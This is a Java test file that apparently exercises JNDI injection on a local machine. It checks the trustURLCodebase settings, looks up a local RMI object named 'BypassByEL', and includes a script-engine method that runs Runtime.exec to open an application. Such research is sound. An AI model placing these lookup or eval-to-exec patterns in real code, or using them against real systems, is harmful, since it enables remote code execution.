import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;

/**
 * https://www.cnblogs.com/liangzai6/p/14093411.html
 * https://www.freebuf.com/column/207439.html
 */
public class TestJndi {
    public static void main(String[] args) throws Exception{
        rmiSystemProperties();
        initialContext();
//        scriptEngineManager();
    }

    private static void rmiSystemProperties() {
        System.out.printf("com.sun.jndi.rmi.object.trustURLCodebase: %s\n",System.getProperty("com.sun.jndi.rmi.object.trustURLCodebase"));
        System.out.printf("com.sun.jndi.cosnaming.object.trustURLCodebase: %s\n",System.getProperty("com.sun.jndi.cosnaming.object.trustURLCodebase"));
//        System.setProperty("java.rmi.server.codebase","false");
    }

    private static void scriptEngineManager() throws InstantiationException, IllegalAccessException, ClassNotFoundException, ScriptException {
        ScriptEngineManager o = (ScriptEngineManager) "".getClass().forName("javax.script.ScriptEngineManager").newInstance();
        o.getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('open /Applications/WeChat.app')");
    }

    private static void initialContext() throws NamingException {
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase", "false");
        InitialContext ctx = new InitialContext();
//        ctx.lookup("rmi://127.0.0.1/ExecTemplateJDK8");
        ctx.lookup("rmi://127.0.0.1/BypassByEL");
    }
}
